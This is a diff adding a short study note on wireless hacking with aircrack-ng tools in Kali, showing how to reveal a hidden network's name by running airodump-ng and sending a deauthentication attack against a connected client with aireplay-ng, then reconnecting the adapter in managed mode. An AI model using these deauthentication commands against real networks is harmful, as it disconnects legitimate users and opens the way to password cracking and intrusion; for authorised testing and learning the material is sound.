@@ -1,0 +1,21 @@
+Discovering names of hidden networks
+A hidden network is one that does not broadcast its name o ESSID. Hidden networks still broadcast their exisance (channel, BSSID). Problem is that we cannot conect or even attempt to crack its password. 
+Solutions: Airodump-ng can determine the ESSID if the network is active. Deauth one of the connected clients for a short period of time.
+
+# get information about networks around, INT is the wirelles adapter in monitor mode
+$ airodump-ng INT
+Hidden network is where ESSID = <length: 0>. We can see its BSSID, power, channel, enryption,…
+# run airodump-ng against BSSID and CHANNEL of the hidden network
+$ airodump-ng --bssid BSSID --channel CHANNEL INT
+# If the network is NOT active, airodump-ng will not be able to get its name (#Data)
+# But we can see some device connected to that network, so we try a deauththentication attack (in new terminal windows) for very short time and once it reconnect, it will send the name to the air
+$ aireplay-ng --deauth 4 -a NETWORK_MAC -c CLIENT_MAC
+# now you should see ESSID in the running airodump-ng windows
+
+Connecting to hidden networks
+Wirelles adapter in monitor mode is not able to connect to a specific network. We need to switch it back to manage mode. $ airmon-ng stop INT $ iwconfig INT mode managed or just psysically disconnect wirelless adapter and reconnect it again.
+# check adapter mode
+$ iwconfig
+# start network manager again, if it is not running
+$ service network-manager start
+Now go to you network manager in Kali machine, Wifi, connect to hidden network, it will ask you for the network name (ESSID) and wifi security (also can be seen in output from airodump-ng)
